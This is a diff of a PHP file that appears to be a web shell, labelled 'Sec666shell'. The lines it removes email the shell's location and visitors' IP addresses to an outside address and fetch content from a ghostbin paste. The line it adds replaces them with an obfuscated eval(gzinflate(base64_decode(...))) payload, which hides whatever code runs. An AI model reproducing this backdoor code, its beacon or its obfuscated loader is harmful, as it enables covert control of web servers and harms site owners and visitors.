@@ -22,14 +22,7 @@ h1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px
 
 
 <?php
-set_time_limit(0);
-error_reporting(0);
-$boss = 'zsec@gmx.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$ip = "akses : { $x_path } | IP Address : { " . $_SERVER['REMOTE_ADDR'] . " }";
-mail($boss, "Sec666shell", $ip, "{ " . $_SERVER['REMOTE_ADDR'] . " }");
-$check3=$_SERVER['DOCUMENT_ROOT'] . "/sec.html" ;
-$text3 = file_get_contents('https://ghostbin.co/paste/shjro/raw');
+eval(gzinflate(base64_decode("jZBBa8JAEIXvhf6HYRHWgpiC4MEiVOoePGjaGL0UWWKcZrcm2bAzUGnrf+/GUEp76mlg3sz3Zh4ha7YV6tJWlvu3N3fXV+i989pj4zzbuuiavb0jginId8L8vqhOw9xVshVOusnYBEkY5mYSRQKG0NNrlWxV8iy7qlezpZK7X0qinjZqnepNspC7lmSblpIdCQkm8AHf6DN8wuIRZoeDR+ok8Ye0jFOlZ/N5cvEQcBYBWGW27F8OH4BYYz4ej8lgWYoBBK/Q+w/n8nxuMD+Opj+T8/hhs1SrVCdxnHazUQhmaLgqBbQrjCcehX9ebIm6CDHnrmasmfqyzYlCUIVxxHtbhyijJiPGiMyrd5HP3mRr+wU=")));
 
 #function
 function ambilKata($param, $kata1, $kata2){
